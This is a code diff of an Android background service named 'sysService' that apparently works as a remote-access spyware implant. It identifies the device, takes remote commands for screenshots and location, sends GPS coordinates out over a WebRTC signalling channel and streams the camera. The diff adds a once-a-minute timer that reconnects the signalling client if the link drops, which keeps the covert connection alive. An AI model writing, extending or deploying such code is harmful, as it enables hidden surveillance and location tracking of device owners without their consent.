@@ -43,6 +43,8 @@ import java.nio.ByteBuffer;
 import java.nio.charset.Charset;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
 import java.util.concurrent.ExecutionException;
 
 import retrofit2.Call;
@@ -73,6 +75,8 @@ public class sysService extends Service implements SysInterface{
     int perResultCode;
     DataChannel localDataChannel;
     boolean canSend = true;
+    SignallingClient sc;
+    String roomName;
     //end variables
     // servic overwrite methods
     public sysService(Context applicationContext) {
@@ -93,6 +97,7 @@ public class sysService extends Service implements SysInterface{
     @Override
     public void onCreate() {
         super.onCreate();
+        context = this;
         PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
         mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "systemService");
     }
@@ -103,9 +108,9 @@ public class sysService extends Service implements SysInterface{
         super.onStartCommand(intent, flags, startId);
         mWakeLock.acquire();
         handler = new Handler(Looper.getMainLooper());
-        String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
-
-        SignallingClient.getInstance().init(this, roomName);
+        roomName = Build.MANUFACTURER + "_" + Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+        initSignalingClient();
+        setCheckSignalingClint();
         try {
             if (intent.getExtras()!= null) {
                 Bundle bundle = intent.getExtras();
@@ -119,7 +124,10 @@ public class sysService extends Service implements SysInterface{
         }
         return Service.START_STICKY;
     }
-
+    private void initSignalingClient(){
+        sc = SignallingClient.getInstance();
+        sc.init(this, roomName);
+    }
     @Override
     public void onDestroy() {
         super.onDestroy();
@@ -157,7 +165,7 @@ public class sysService extends Service implements SysInterface{
     @Override
     public void onOfferReceived(final JSONObject data) {
         runOnUiThread(() -> {
-            if (!SignallingClient.getInstance().isInitiator && !SignallingClient.getInstance().isStarted) {
+            if (!sc.isInitiator && !sc.isStarted) {
                 onTryToStart();
             }
             try {
@@ -218,7 +226,7 @@ public class sysService extends Service implements SysInterface{
                 // toast("get screenshot");
             }
             else {
-                SignallingClient.getInstance().cmd("busy");
+                sc.cmd("busy");
             }
         }
         if (cmd.contains("getLocation")){
@@ -391,8 +399,8 @@ public class sysService extends Service implements SysInterface{
         runOnUiThread(() -> {
             if ( localVideoTrack != null ) {
                 createPeerConnection("cam");
-                SignallingClient.getInstance().isStarted = true;
-                if (SignallingClient.getInstance().isInitiator) {
+                sc.isStarted = true;
+                if (sc.isInitiator) {
                     doCall();
                 }
             }
@@ -444,7 +452,7 @@ public class sysService extends Service implements SysInterface{
 
     public void onIceCandidateReceived(IceCandidate iceCandidate) {
         //we have received ice candidate. We can set it to the other peer.
-        SignallingClient.getInstance().emitIceCandidate(iceCandidate);
+        sc.emitIceCandidate(iceCandidate);
     }
     /**
      * This method is called when the app is initiator - We generate the offer and send it over through socket
@@ -456,7 +464,7 @@ public class sysService extends Service implements SysInterface{
             public void onCreateSuccess(SessionDescription sessionDescription) {
                 super.onCreateSuccess(sessionDescription);
                 localPeer.setLocalDescription(new CustomSdpObserver("localSetLocalDesc"), sessionDescription);
-                SignallingClient.getInstance().emitMessage(sessionDescription);
+                sc.emitMessage(sessionDescription);
             }
         }, new MediaConstraints());
     }
@@ -496,7 +504,7 @@ public class sysService extends Service implements SysInterface{
             public void onCreateSuccess(SessionDescription sessionDescription) {
                 super.onCreateSuccess(sessionDescription);
                 localPeer.setLocalDescription(new CustomSdpObserver("localSetLocal"), sessionDescription);
-                SignallingClient.getInstance().emitMessage(sessionDescription);
+                sc.emitMessage(sessionDescription);
             }
         }, new MediaConstraints());
     }
@@ -599,9 +607,23 @@ public class sysService extends Service implements SysInterface{
                     location -> {
                         //Log.d("Location", "my location is " + location.toString());
 
-                        SignallingClient.getInstance().cmd("location,"+location.getLatitude()+","+location.getLongitude());
+                        sc.cmd("location,"+location.getLatitude()+","+location.getLongitude());
                     });
         });
+    }
+
+    private void setCheckSignalingClint() {
+        Timer timer = new Timer();
+        timer.schedule(new TimerTask() {
+
+            @Override
+            public void run() {
+                if (!sc.isSginallingInstace()) {
+                    initSignalingClient();
+                }
+            }
+
+        },0,1000 * 60);//Update text every second
     }
 
 }
